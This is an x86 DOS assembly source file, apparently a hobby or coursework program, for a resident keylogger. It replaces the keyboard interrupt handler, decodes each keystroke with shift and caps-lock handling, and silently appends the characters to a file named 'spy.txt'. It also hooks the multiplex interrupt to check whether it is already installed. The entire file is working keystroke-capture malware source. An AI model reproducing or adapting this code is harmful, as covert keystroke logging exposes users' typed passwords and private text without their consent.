.486
.model small
.stack 1000
.data
    old_2fh     dd 0
    old         dd 0  
    isSet       db ?
    intSet      db 'Program is resident', '$'   
    intAlreadySet db 'Program is already resident', '$' 
    invFile     db 'File "spy.txt" is absent or corrupred', '$'  
    endl        db 0Dh, 0Ah, '$'    
.code    
    scancode    db ?
    char        db ?
    
    filename    db 'spy.txt',0
    shiftFlag   db 0
    capsFlag    db 0
    ASCIITableL db '*', '*', "1234567890-=", '*', 09h
                db "qwertyuiop[]", '*', '*' 
                db "asdfghjkl;'`", '*', "\zxcvbnm,./"
                db '*', '*', '*', 20h
    ASCIITableU db '*', '*', "!@#$%^&*()_+", '*', 09h
                db "QWERTYUIOP{}", '*', '*' 
                db 'ASDFGHJKL:"~', '*', "|ZXCVBNM<>?" 
                db '*', '*', '*', 20h           
    
    ascCount    equ 39h
    
new_handle proc        
    push ds si es di dx cx bx ax 
    
    xor ax, ax 
    in  al, 60h        ; get scancode             
    call getASCII
    mov char, al
    cmp char, 0
    je old_handler       
    
;---- put char into file -----;         
    push cs   ;make ds point to cs
    pop ds
    
    mov ah,3dh          ; open file
    mov al,1            ; write mode
    mov dx,offset filename   ; DS:DX 
    int 21h
    jnc moveFD    	; move fd to bx
    
noFile:
; failed -> try to create file
    mov ah, 5bh
    mov cx, 0
    lea dx, filename 
    int 21h
    jc old_handler       ; failed again -> call default hadler and exit
moveFD:            
    mov bx,ax            ; df to bx
    
    xor cx,cx                
    xor dx,dx                
    mov ah, 42h       ; set fp to end of file
    mov al, 02h
    int 21h   
    
    mov ah,40h         ; write
    mov cl,1         
    mov dx,offset char      
    int 21h  
    
    mov ah,3eh         ; close file
    int 21h
        
old_handler: 
    pop ax bx cx dx di es si ds                       
    jmp dword ptr cs:old        ;call default handler
    xor ax, ax
    mov al, 20h
    out 20h, al 
    jmp exit
            
endInt:
    xor ax, ax
    mov al, 20h
    out 20h, al 
    pop ax bx cx dx di es si ds 

    iret
new_handle endp 

new_2fh proc
    cmp ah,0f1h        ; check multiplex. int. function number
    jne out_2fh        ; not f1h -> out
    cmp al,00h         ; try to repeat installation?
    je inst            ; tell it's restricted
    
    jmp short out_2fh        ; function is undefined -> out
inst:  
    mov al,0ffh        ; program is already resident
    iret
out_2fh:
    jmp dword ptr ds:old_2fh
    iret 
new_2fh endp         
;gets scan code in ax
;returns ascii code in ax
getASCII proc
;check if special keys were pressed
    cmp al, 2Ah     ;left shift?
    je shiftPressed
    cmp al, 39h     ;right shift?
    je shiftPressed 
    cmp al, 3Ah     ;CAPS?
    je capsPressed    
;check if special keys were released    
    sub al, 80h
    cmp al, 2Ah     ;left shift?
    je shiftReleased
    cmp al, 39h     ;right shift?
    je shiftReleased 
    cmp al, 3Ah     ;CAPS?
    je capsPressed             
    
;if special keys weren't the case
; + we don't handle other keys releases
    add al, 80h      
    cmp al, 80h
    ja flagsHandled
;decide if lower case or higher case is required    
    cmp capsFlag, 0
    jne capsNotActive
    cmp shiftFlag, 0
    je lowCase
    jmp upCase
capsNotActive:
    cmp shiftFlag, 1
    je lowCase
    jmp upCase    
    
shiftPressed:
    mov shiftFlag, 1
    jmp flagsHandled
shiftReleased:
    mov shiftFlag, 0
    jmp flagsHandled 
capsPressed:
    cmp capsFlag, 0
    jne resetCaps
    mov capsFlag, 1
    jmp flagsHandled
resetCaps:
    mov capsFlag, 0
    jmp flagsHandled    
    
lowCase:    
    lea di, ASCIITableL
    xor cx, cx                    
    cmp al, ascCount
    ja notChar
    jmp skip
    
upCase:    
    lea di, ASCIITableU
    xor cx, cx     
    cmp al, ascCount
    ja notChar    
    
skip:
    cmp cl, al
    jae get
    inc di
    add cl, 1
    jmp skip 
     
get:
    mov al, cs:[di]
    jmp fin    
notChar:
    mov al, '*'
    jmp fin
flagsHandled:
    xor ax, ax

fin:        
    ret
getASCII endp
new_end:
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
displayM macro string
    pusha
    displaySingle string
    displaySingle endl
    popa
endm 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
displaySingle macro string
    lea dx, string
    mov ah, 09h
    int 21h
endm
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
main:
    mov ax, @data
    mov ds, ax
    
    mov ah,0f1h        ; check if program is already resident
    mov al,0          
    int 2fh
    cmp al,0ffh        ; resident?
    jne isNotSet 
    displayM intAlreadySet
    jmp exit
    
    isNotSet:
    displayM intSet
    
    cli 		;disable interruptions
    pushf 
    push 0        	;send 0 to ds
    pop ds
    mov eax, ds:[2fh*4] 
    mov cs:[old_2fh], eax ;save default handler
    
    mov ax, cs
    shl eax, 16		; <--- 16 bit, [data][ah][al]
    mov ax, offset new_2fh
    mov ds:[2fh*4], eax ;set new handler

    pushf 
    push 0       	 ;send 0 to ds
    pop ds
    mov eax, ds:[09h*4] 
    mov cs:[old], eax ;save default handler
    
    mov ax, cs
    shl eax, 16
    mov ax, offset new_handle
    mov ds:[09h*4], eax ;set new handler
    sti 		;allow interruptions
    
    xor ax, ax
    mov ah, 31h  	; exit, but stay resident
   
    ;resident size in paragraphs (16 bytes)
    mov dx, (new_end - @code + 10FH) / 16
    int 21h 
    
exit:
    mov ax,4C00h
    int 21h  
end main